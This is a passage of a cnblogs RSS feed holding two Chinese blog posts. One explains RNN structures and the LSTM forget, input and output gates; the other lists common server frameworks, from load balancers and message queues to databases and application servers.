&lt;p align=&quot;left&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;　　2、&lt;span lang=&quot;EN-US&quot;&gt;U、&lt;span lang=&quot;EN-US&quot;&gt;W、&lt;span lang=&quot;EN-US&quot;&gt;V是参数矩阵，&lt;span lang=&quot;EN-US&quot;&gt;b、&lt;span lang=&quot;EN-US&quot;&gt;c是偏置项，&lt;span lang=&quot;EN-US&quot;&gt;f是激活函数，通常采用&lt;span lang=&quot;EN-US&quot;&gt;”热撸&lt;span lang=&quot;EN-US&quot;&gt;”、&lt;span lang=&quot;EN-US&quot;&gt;tanh函数作为激活函数，用&lt;span lang=&quot;EN-US&quot;&gt;softmax将输出转换成各个类别的概率。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span lang=&quot;EN-US&quot;&gt;　　3、上图为经典的&lt;span lang=&quot;EN-US&quot;&gt;RNN结构，其运算过程可以表示为：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224214959971-2011949945.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;式中：&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223450971-788013637.png&quot; alt=&quot;&quot;/&gt;表示神经网络的输出；&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223501782-39563246.png&quot; alt=&quot;&quot;/&gt;表示前一个时间点的状态；&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　4、考虑到输入与输出的关系，序列问题具有以下分类：&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;       一对多的RNN结构：序列输出，用于图像字幕，如图1.2所示。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215017899-1995710026.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.2&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　多对一的RNN结构：序列输入，用于情感分类，如图1.3所示。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215027440-821006340.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.3&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　多对多：序列输入和输出，用于机器翻译&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　同步多对多：同步序列输入和输出，用于视频分类&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;二、LSTM的原理&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　上面第一部分简单介绍了RNN的几种结构，接下来，介绍一下RNN的改进版：LSTM。LSTM（long short-term memory，长短时记忆网络），&lt;strong&gt;它的出现解决了很难处理的“长程依赖”问题，即无法学到序列中蕴含的间隔时间较长的规律&lt;/strong&gt;。&lt;strong&gt;RNN&lt;/strong&gt;每一层的隐状态都由前一层的隐状态经过变换和激活函数得到，反向传播求导时最终得到的导数会包含每一步梯度的连乘，将&lt;strong&gt;会引起梯度的消失或者梯度的爆炸&lt;/strong&gt;。LSTM在隐状态使用了加法替代了每一步的迭代变换，这样便可以避免梯度消失的问题，从而使得网络学到长程的规律。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;RNN可用图1.4表示&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215042736-216267140.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.4&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　同理，LSTM的结构图1.5所示&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215206080-711291897.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.5&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　其中图1.5中的符号，长方形表示对输入的数据做变换或激活函数；圆形表示逐点，逐点运算是指两个形状完全相同的矩形的对应位置进行相加、相乘或者其他的一些运算；箭头则表示向量会在那里进行运算。注意：&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223121383-395541648.png&quot; alt=&quot;&quot;/&gt; 通过concat操作，才进入Sigmoid或tanh函数。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　RNN与LSTM有所不同，LSTM的隐状态有两部分，一部分是h&lt;sub&gt;t&lt;/sub&gt; ，另一部分则是&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223325955-955784899.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223333411-1443248906.png&quot; alt=&quot;&quot;/&gt;在各个步骤之间传递的主要信息，绿色的水平线可看作“主干道”，如图1.6所示。&lt;strong&gt;通过加法，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223318859-91155467.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;strong&gt;可以无障碍的在这条主干道上传递，因此较远的梯度也可以在长程上传播&lt;/strong&gt;，这便是&lt;strong&gt;LSTM的核心思想&lt;/strong&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215225209-925870473.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.6&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　但是，不是每一步的信息&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223309780-119926262.png&quot; alt=&quot;&quot;/&gt;都是完全使用前一步的&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223240984-1758794796.png&quot; alt=&quot;&quot;/&gt;，而是在 &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223246526-854563400.png&quot; alt=&quot;&quot;/&gt;的基础之上“遗忘”掉一些内容，或“记住”一些内容。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;　　1、  遗忘门，我们首先谈一谈遗忘门，每个单元都有一个“遗忘门”，用来控制遗忘掉 &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223215652-265557503.png&quot; alt=&quot;&quot;/&gt;的那些部分，其结构如图1.7所示。其中σ是sigmoid激活函数，它的输出在0~1之间，遗忘门输出的 &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223224150-1582511388.png&quot; alt=&quot;&quot;/&gt;相同形状的矩阵，该矩阵将会和&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223231788-121631435.png&quot; alt=&quot;&quot;/&gt;逐点相乘，决定遗忘掉那部分内容。经过激活函数的输出，f取值接近0的维度上的信息就会被“忘记”，而f取值接近1的维度上的信息就会被保留。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215237247-535839735.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.7&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2、 输入层，如图1.8，在循环神经网络“忘记”了部分之前的状态后，它还需要从当前的输入补充最新的记忆，这个过程就是“输入门”完成的。输入门的输入同样是两项，分别是：&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223121383-395541648.png&quot; alt=&quot;&quot;/&gt;。它的输出项，一项是 &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223051021-204479277.png&quot; alt=&quot;&quot;/&gt;，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223044657-1825841469.png&quot; alt=&quot;&quot;/&gt;同样经过Sigmoid函数运算得到，其值都是在0~1之间，还有一项&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224222750500-404510145.png&quot; alt=&quot;&quot;/&gt;。最终要“记住”的内容是&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224222750500-404510145.png&quot; alt=&quot;&quot;/&gt;与&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223100837-1361440650.png&quot; alt=&quot;&quot;/&gt;点相乘，如图1.9。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215249600-1046981042.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.8&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215301143-1876034257.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.9&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3、  输出门，输出门用于计算另一个隐状态的值，真正的输出（如类别）需要通过做进一步运算得到。输出门的结构如图1.20所示，同样根据&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224222853039-621789226.png&quot; alt=&quot;&quot;/&gt;计算，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224222934527-248476725.png&quot; alt=&quot;&quot;/&gt;中每一个数值在0~1之间，&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224222953600-264936354.png&quot; alt=&quot;&quot;/&gt;通过&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224223009183-50994064.png&quot; alt=&quot;&quot;/&gt;得到。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224215310917-1533101354.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;span&gt;图1.20&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;最终总结：LSTM中每一步的输入是&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224224451384-623826756.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;span&gt;，隐状态是&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224224404723-269160724.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;span&gt;，最终的输出必须要经过&lt;img src=&quot;https://img2018.cnblogs.com/blog/1456807/201902/1456807-20190224224429960-1549342234.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;span&gt;进一步变换得到。&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 24 Feb 2019 14:45:00 +0000</pubDate>
<dc:creator>泽积</dc:creator>
<og:description>本文主要针对RNN与LSTM的结构及其原理进行详细的介绍，了解什么是RNN，RNN的1对N、N对1的结构，什么是LSTM，以及LSTM中的三门（input、ouput、forget），后续将利用深度学</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/shenpings1314/p/10428519.html</dc:identifier>
</item>
<item>
<title>服务器架构框架 - DASK</title>
<link>http://www.cnblogs.com/dask/p/10428467.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dask/p/10428467.html</guid>
<description>&lt;hr/&gt;&lt;h3 id=&quot;注以下是一些服务器开发时常见框架的汇总其中的排名是根据本人熟悉程度排序不代表任何官方排名详细性能比较请参考所提供的博客通道&quot;&gt;注：以下是一些服务器开发时常见框架的汇总，其中的排名是根据本人熟悉程度排序，不代表任何官方排名，详细性能比较请参考所提供的博客通道。&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190224105216289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMTE1NzAy,size_16,color_FFFFFF,t_70&quot; alt=&quot;服务器架构整体框架&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;h2 id=&quot;负载均衡服务器&quot;&gt;1. 负载均衡服务器&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;
&lt;h3 id=&quot;硬件类&quot;&gt;硬件类&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;F5 BIG-IP&lt;/strong&gt;负载均衡器 基于简单的Web管理界面，具有负载均衡、应用交换、会话交换、状态监控、智能网络地址转换、通用持续性、响应错误处 理、IPv6网关、高级路由等很多功能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Array&lt;/strong&gt; 新一代L4-L7应用交付控制器，Web应用加速器高性能SSL VPN，全局访问控制器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Radware&lt;/strong&gt; 可以做到本地的服务器负载均衡(AD)和广域的全局服务器负载均衡(AD -Global)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NetScaler&lt;/strong&gt; 优化Web 应用交付的综合解决方案&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;思科&lt;/strong&gt; 思科几乎每个IOS路由器都具有负载均衡功能&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;梭子鱼负载均衡&lt;/strong&gt; 0最大特点是包含了网络安全功能&lt;br/&gt;附：&lt;a href=&quot;https://www.cnblogs.com/lcword/p/5773296.html&quot;&gt;&lt;u&gt;软/硬件负载均衡产品 你知多少？&lt;/u&gt;&lt;/a&gt;&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&quot;软件类&quot;&gt;软件类&lt;/h3&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;反向代理服务器&quot;&gt;2. 反向代理服务器&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://nginx.org/en/&quot;&gt;&lt;u&gt;Nginx&lt;/u&gt;&lt;/a&gt; 一个高性能的HTTP和反向代理服务，也是一个IMAP/POP3/SMTP服务&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.haproxy.org/&quot;&gt;&lt;u&gt;HAProxy&lt;/u&gt;&lt;/a&gt; 一款应对客户端10000以上的同时连接的高性能的TCP和HTTP负载均衡器&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.squid-cache.org/&quot;&gt;&lt;u&gt;Squid&lt;/u&gt;&lt;/a&gt; 一个高性能的代理缓存服务器，&lt;em&gt;Squid&lt;/em&gt;支持FTP、gopher、HTTPS和HTTP协议&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://varnish-cache.org/&quot;&gt;&lt;u&gt;Varnish&lt;/u&gt;&lt;/a&gt; 一款高性能的开源HTTP加速器&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://trafficserver.apache.org/&quot;&gt;&lt;u&gt;Apache TS&lt;/u&gt;&lt;/a&gt; 一个高性能的、模块化的HTTP代理和缓存服务器&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;附：&lt;a href=&quot;https://blog.csdn.net/zhu_tianwei/article/details/19396527&quot;&gt;&lt;u&gt;几种反向代理 服务器比较&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;消息队列系统mq&quot;&gt;3. 消息队列系统（MQ）&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://www.rabbitmq.com/&quot;&gt;&lt;u&gt;RabbitMQ&lt;/u&gt;&lt;/a&gt; 一款实现了高级消息队列协议（A&lt;em&gt;MQ&lt;/em&gt;P）的开源消息代理软件&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://kafka.apache.org/&quot;&gt;&lt;u&gt;Apache kafka&lt;/u&gt;&lt;/a&gt; 一个开源消息系统项目，由Scala写成。该项目的目标是为处理实时数据提供一个统一、高通量、低等待的平台。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://zeromq.org/&quot;&gt;&lt;u&gt;zeroMQ&lt;/u&gt;&lt;/a&gt; 一种基于消息队列的多线程网络库，其对套接字类型、连接处理、帧、甚至路由的底层细节进行抽象，提供跨越多种传输协议的套接字&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://activemq.apache.org/&quot;&gt;&lt;u&gt;Apache ActiveMQ&lt;/u&gt;&lt;/a&gt; Apache软件基金会所研发的开放源代码消息中间件，是一个纯Java程序&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;整体上看RabbitMQ的综合性能会更佳一些&lt;br/&gt;附:&lt;a href=&quot;https://www.cnblogs.com/ly-radiata/articles/5563744.html&quot;&gt;&lt;u&gt;MQ框架的比较&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;web服务器&quot;&gt;4. Web服务器&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://httpd.apache.org/&quot;&gt;&lt;u&gt;Apache&lt;/u&gt;&lt;/a&gt; 世界排名第一的web服务器&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://tomcat.apache.org/&quot;&gt;&lt;u&gt;Tomcat&lt;/u&gt;&lt;/a&gt; 一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://nginx.org/en/&quot;&gt;&lt;u&gt;Nginx&lt;/u&gt;&lt;/a&gt; 一个高性能的HTTP和反向代理服务器&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.iis.net/&quot;&gt;&lt;u&gt;IIS&lt;/u&gt;&lt;/a&gt; 由微软公司提供的基于运行Microsoft Windows的互联网基本服务&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.pulsesecure.net/&quot;&gt;&lt;u&gt;Zeus Web Server&lt;/u&gt;&lt;/a&gt; 在国外的技术媒体当中将这种服务器看成具有极高的稳定性、适应性并具备很高的可配置性的服务器软件&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.lighttpd.net/&quot;&gt;&lt;u&gt;Lighttpd&lt;/u&gt;&lt;/a&gt; 个具有非常低的内存开销，cpu占用率低，效能好，以及丰富的模块等特点的服务器&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;附：&lt;a href=&quot;https://www.cnblogs.com/tommyli/p/3945211.html&quot;&gt;&lt;u&gt;三大WEB服务器对比分析（Apache ,Lighttpd,Nginx）&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;分布式缓存系统&quot;&gt;5. 分布式缓存系统&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://redis.io/&quot;&gt;&lt;u&gt;Redis&lt;/u&gt;&lt;/a&gt; 一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://memcached.org/&quot;&gt;&lt;u&gt;Memcached&lt;/u&gt;&lt;/a&gt; 一个高性能的分布式内存对象缓存系统,用于动态Web应用以减轻数据库负载&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.oschina.net/p/tair&quot;&gt;&lt;u&gt;Tair&lt;/u&gt;&lt;/a&gt;（阿里巴巴） 淘宝的一个开源项目,它是一个分布式的key/value结构数据的解决方案&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;附：&lt;a href=&quot;https://www.cnblogs.com/dumi/p/8660677.html&quot;&gt;&lt;u&gt;常用的分布式缓存的对比&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;分布式文件系统&quot;&gt;6. 分布式文件系统&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://moosefs.com/&quot;&gt;&lt;u&gt;MooseFS(MFS)&lt;/u&gt;&lt;/a&gt; 一个高可用的故障容错分布式文件系统&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://ceph.com/&quot;&gt;&lt;u&gt;Ceph&lt;/u&gt;&lt;/a&gt; 一个可靠地、自动重均衡、自动恢复的分布式存储系统&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gluster.org/&quot;&gt;&lt;u&gt;GlusterFS&lt;/u&gt;&lt;/a&gt; 一款自由软件，文档也比较齐全，不难上手&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://hadoop.apache.org/docs/stable/hadoop-project-dist/hadoop-hdfs/HdfsUserGuide.html&quot;&gt;&lt;u&gt;Hadoop HDFS&lt;/u&gt;&lt;/a&gt; 一个分布式文件系统，适用于商用硬件上高数据吞吐量对大数据集的访问的需求&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/chiangchou/p/fastdfs.html#_label1_2&quot;&gt;&lt;u&gt;FastDFS&lt;/u&gt;&lt;/a&gt; 一个开源的轻量级分布式文件系统&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lustre.org/&quot;&gt;&lt;u&gt;Lustre&lt;/u&gt;&lt;/a&gt; 一种平行分布式文件系统，通常用于大型计算机集群和超级电脑&lt;/li&gt;
&lt;li&gt;除此以外，很多公司提供的对象存储OSS也是很不错的选择&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;附：&lt;a href=&quot;https://www.cnblogs.com/zhiguo/p/3334993.html&quot;&gt;&lt;u&gt;分布式文件系统MFS、Ceph、GlusterFS、Lustre的对比&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;搜索服务器&quot;&gt;7. 搜索服务器&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.elastic.co/webinars/getting-started-elasticsearch?baymax=rtp&amp;amp;elektra=home&amp;amp;storm=sub1&amp;amp;iesrc=ctr&quot;&gt;&lt;u&gt;Elasticsearch&lt;/u&gt;&lt;/a&gt; 一个基于Lucene的搜索服务器。它提供了一个分布式多用户能力的全文搜索引擎，基于RESTful web接口&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://lucene.apache.org/solr/&quot;&gt;&lt;u&gt;Solr&lt;/u&gt;&lt;/a&gt; 提供了较为完备的搜索引擎解决方案，实现站内搜索扩展性较好并且可以减少程序员的工作量&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;附：&lt;a href=&quot;https://blog.csdn.net/zhangdefeng2008/article/details/79591481&quot;&gt;&lt;u&gt;分布式搜索和分析引擎对比&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;sql数据库&quot;&gt;8. SQL数据库&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.mysql.com/&quot;&gt;&lt;u&gt;Mysql&lt;/u&gt;&lt;/a&gt; 最流行的关系型数据库管理系统,在 WEB 应用方面 MySQL 是最好的 RDBMS&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.oracle.com/technetwork/database/enterprise-edition/downloads/index.html&quot;&gt;&lt;u&gt;Oracle DB&lt;/u&gt;&lt;/a&gt; 目前世界上流行的关系&lt;em&gt;数据库&lt;/em&gt;管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.microsoft.com/zh-cn/sql-server/sql-server-downloads&quot;&gt;&lt;u&gt;SQL Server&lt;/u&gt;&lt;/a&gt; 由Microsoft开发和推广的关系数据库管理系统（DBMS）&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.ibm.com/analytics/us/en/db2/&quot;&gt;&lt;u&gt;DB2&lt;/u&gt;&lt;/a&gt; 主要应用于大型应用系统，具有较好的可伸缩性，可支持从大型机到单用户环境&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;附：&lt;a href=&quot;https://www.cnblogs.com/cp168168/p/7237950.html&quot;&gt;&lt;u&gt;常见主流SQL数据库对比介绍&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;nosql数据库&quot;&gt;9. NoSQL数据库&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.mongodb.com/&quot;&gt;&lt;u&gt;MongoDB&lt;/u&gt;&lt;/a&gt; 由C++语言编写。旨在为WEB应用提供可扩展的高性能数据存储解决方案&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://memcached.org/&quot;&gt;&lt;u&gt;Memcache&lt;/u&gt;&lt;/a&gt; 一套分布式的高速缓存系统，目前被许多网站使用以提升网站的访问速度，尤其对于一些大型的、需要频繁访问数据库的网站访问速度提升效果十分显著&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://redis.io/&quot;&gt;&lt;u&gt;Redis&lt;/u&gt;&lt;/a&gt; 一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://hbase.apache.org/&quot;&gt;&lt;u&gt;HBase&lt;/u&gt;&lt;/a&gt; 一个分布式的、面向列的开源数据库&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://leveldb.org/&quot;&gt;&lt;u&gt;LevelDB&lt;/u&gt;&lt;/a&gt; 一个google实现的非常高效的kv数据库&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.couchbase.com/&quot;&gt;&lt;u&gt;Couchbase&lt;/u&gt;&lt;/a&gt; 是MemBase与couchDb这两个NoSQL数据库的合并的产物,是一个分布式的面向文档的NoSQL数据库管理系统&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;附：&lt;a href=&quot;https://www.cnblogs.com/zgblog/p/5488735.html&quot;&gt;&lt;u&gt;几款主流 NoSql 数据库的对比&lt;/u&gt;&lt;/a&gt;&amp;amp;&amp;amp;&lt;a href=&quot;http://rdc.hundsun.com/portal/article/736.html&quot;&gt;&lt;u&gt;Couchbase vs Redis，究竟哪个更胜一筹？&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;应用服务器&quot;&gt;10. 应用服务器&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;Apache
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://tomcat.apache.org/&quot;&gt;&lt;u&gt;Tomcat&lt;/u&gt;&lt;/a&gt; 一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;IBM
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.ibm.com/developerworks/cn/downloads/ws/was/&quot;&gt;&lt;u&gt;Websphere&lt;/u&gt;&lt;/a&gt; 包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Macromedia
&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://wildfly.org/&quot;&gt;&lt;u&gt;Wildfly&lt;/u&gt;&lt;/a&gt;(原名JBoss ApplicaTIon Server) 一个开源的基于JavaEE的轻量级应用服务器,&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.nec.com/en/global/prod/webotx/en/key_features.html?&quot;&gt;&lt;u&gt;NEC WebOTX ApplicaTIon Server&lt;/u&gt;&lt;/a&gt; 运行更稳定,支持最新的开放技术,提高开发效率&lt;/li&gt;
